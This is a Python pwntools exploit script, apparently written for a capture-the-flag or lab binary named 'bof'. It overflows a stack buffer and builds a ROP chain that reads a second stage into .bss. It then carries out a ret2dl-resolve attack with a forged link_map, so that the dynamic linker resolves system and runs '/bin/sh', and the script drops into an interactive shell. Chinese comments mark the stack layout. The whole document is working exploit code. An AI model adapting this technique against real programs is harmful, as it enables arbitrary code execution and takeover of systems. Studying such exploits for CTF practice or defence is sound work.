#!/bin/python3
from pwn import *
# context.log_level = 'debug'

elf = ELF('./bof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 0x70+8
read_plt = elf.plt['read']

bss_addr = 0x601050
base_stage = bss_addr + 0x100

pop_rdi_ret = 0x4007a3
pop_rsi_r15_ret = 0x4007a1
plt_load = 0x400506  # jmp got[2]

p = process('./bof')
p.recvuntil('\n')
payload  = b'a'*offset
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_r15_ret)
payload += p64(base_stage)
payload += p64(0)
payload += p64(read_plt)            # read(0, base_stage, 0x100)
payload += p64(pop_rsi_r15_ret)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(base_stage+0x40)     # cmd_addr
payload += p64(plt_load)            # jmp dl_resolve (got[2])
payload += p64(base_stage)          # 已经 push 的 link_map (got[1])
payload += p64(0)                   # 已经 push 的 n

pause()
p.sendline(payload)

write_got = elf.got['write']
l_addr = libc.sym['system'] - libc.sym['write']

def fake_linkmap_payload(fake_linkmap_addr, known_func_plt, offset):
    # 0x00 DT_STRTAB
    linkmap  = p64(offset & (2**64-1))              # 0x00 l_addr

    linkmap += p64(0x17)                            # 0x08 DT_JMPREL
    linkmap += p64(fake_linkmap_addr + 0x18)        # 0x10 fake_rela
    
    # 0x18
    linkmap += p64((fake_linkmap_addr - offset) & (2**64-1))   # Rela -> r_offset
    linkmap += p64(0x7)                             # Rela -> r_info
    linkmap += p64(0)                               # Rela -> r_append

    linkmap += p64(0x6)                             # 0x30 DT_SYMTAB
    linkmap += p64(known_func_plt - 0x8)

    linkmap += b'/bin/sh\x00'                       # 0x40
    linkmap  = linkmap.ljust(0x68, b'A')
    linkmap += p64(fake_linkmap_addr)               # 0x68 DT_STRTAB_addr
    linkmap += p64(fake_linkmap_addr + 0x30)        # 0x70 DT_SYMTAB_addr
    linkmap  = linkmap.ljust(0xf8, b'A')
    linkmap += p64(fake_linkmap_addr + 0x8)         # 0xf8 DT_JMPREL_addr
    return linkmap

fake_link_map = fake_linkmap_payload(base_stage, write_got, l_addr)
pause()

p.sendline(fake_link_map)
p.interactive()